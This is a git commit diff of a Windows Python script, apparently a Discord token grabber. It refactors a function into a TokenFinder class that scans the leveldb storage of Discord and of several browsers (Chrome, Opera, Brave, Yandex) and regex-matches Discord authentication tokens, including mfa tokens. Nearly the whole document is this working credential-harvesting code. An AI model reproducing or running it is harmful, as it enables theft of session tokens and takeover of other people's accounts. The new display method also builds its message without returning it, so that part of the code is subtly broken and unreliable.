d68676be760ad7e2caae90afe4204668c96d62b6
TanujKS <tanujsiripurapu@gmail.com>
2021-06-21 12:49:27 -0700

    Stable tokenFinder

--- src/tokenFinder.py
+++ src/tokenFinder.py
@@ -6,53 +6,72 @@ if platform != "win32":
     raise TypeError("This program is only supported on Windows")
 
 
-def findTokens():
-    tokenList = []
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
-
-    for platform, path in paths.items():
-        if not os.path.exists(path):
-            continue
-
-        tokens = extract_tokens(path)
-
-        for token in tokens:
-            tokenList.append(token)
-
-    return tokenList
+class Token:
+    def __init__(self, token, platform):
+        self.token = token
+        self.platform = platform
 
 
-def extract_tokens(path):
-    path += '\\Local Storage\\leveldb'
+    def __str__(self):
+        return self.token
 
-    tokens = []
 
-    for file_name in os.listdir(path):
-        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
-            continue
-        try:
-            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
-                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
-                    for token in re.findall(regex, line):
-                        tokens.append(token)
-        except FileNotFoundError:
-            pass
-    return tokens
+class TokenFinder:
+    def __init__(self):
+        tokens = []
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
+
+        paths = {
+            'Discord': roaming + '\\Discord',
+            'Discord Canary': roaming + '\\discordcanary',
+            'Discord PTB': roaming + '\\discordptb',
+            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+            'Opera': roaming + '\\Opera Software\\Opera Stable',
+            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        }
+
+        for platform, path in paths.items():
+            if not os.path.exists(path):
+                continue
+
+            for token in self.extract_tokens(path):
+                tokens.append(Token(token, platform))
+
+        self.tokens = tokens
+
+
+    @staticmethod
+    def extract_tokens(path):
+        path += '\\Local Storage\\leveldb'
+
+        tokens = []
+
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+            try:
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line):
+                            tokens.append(token)
+            except FileNotFoundError:
+                pass
+        return tokens
+
+
+    def to_list(self):
+        return [token.token for token in self.tokens]
+
+
+    def display(self):
+        message = f"{len(self.to_list())} tokens found:"
+        for token in self.tokens:
+            message += "\n"
+            message += f"{token.platform}: {token.token}"
 
 
 if __name__ == "__main__":
-    tokens = findTokens()
-    print(f"{len(tokens)} tokens found:")
-    for token in tokens:
-        print(token)
+    tokens = TokenFinder()
+    print(tokens.display())
